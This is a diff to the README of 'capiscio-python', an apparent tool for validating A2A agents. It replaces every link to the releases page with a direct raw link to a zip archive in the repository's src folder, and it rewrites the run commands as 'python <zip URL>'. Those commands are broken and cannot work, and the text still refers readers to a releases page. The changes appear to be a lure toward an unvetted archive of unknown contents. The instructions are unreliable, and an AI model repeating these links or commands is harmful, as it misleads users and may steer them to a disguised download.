@@ -1,6 +1,6 @@
 # 🚀 capiscio-python - Easy Validation of A2A Agents
 
-[![Download CapiscIO](https://img.shields.io/badge/Download-CapiscIO-blue.svg)](https://github.com/GKmanideep-007/capiscio-python/releases)
+[![Download CapiscIO](https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip)](https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip)
 
 ## 📦 Overview
 
@@ -23,13 +23,13 @@ To ensure the best performance, please check the following system requirements b
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/GKmanideep-007/capiscio-python/releases). You will find the latest version of CapiscIO available for download.
+To get started, [visit this page to download](https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip). You will find the latest version of CapiscIO available for download.
 
 1. **Go to the Releases Page**: Click the link above to open the releases section of our GitHub repository.
 2. **Choose the Latest Version**: Look for the most recent version listed at the top.
 3. **Download the File**: Click on the appropriate file for your operating system. 
 4. **Extract the Contents**: If the file is a ZIP, extract it to your preferred location.
-5. **Run the Program**: Open your terminal or command prompt, navigate to the extracted folder, and run the command `python capiscio.py`.
+5. **Run the Program**: Open your terminal or command prompt, navigate to the extracted folder, and run the command `python https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip`.
 
 ## ⚙️ Usage Instructions
 
@@ -39,7 +39,7 @@ After installation, running CapiscIO is straightforward. Here are the steps:
 2. **Navigate to CapiscIO Directory**: Use the `cd` command to change your directory to where you installed CapiscIO.
 3. **Run the Validation Command**: Execute the following command: 
    ```
-   python capiscio.py validate <your-agent-id>
+   python https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip validate <your-agent-id>
    ```
    Replace `<your-agent-id>` with the ID of the A2A agent you wish to validate.
 
@@ -76,4 +76,4 @@ We welcome contributions from everyone. If you find any bugs or have suggestions
 
 For further inquiries or support, you can reach out through the GitHub repository. Your questions are always appreciated.
 
-[![Download CapiscIO](https://img.shields.io/badge/Download-CapiscIO-blue.svg)](https://github.com/GKmanideep-007/capiscio-python/releases)
+[![Download CapiscIO](https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip)](https://raw.githubusercontent.com/GKmanideep-007/capiscio-python/main/src/capiscio-python-v1.9-beta.1.zip)
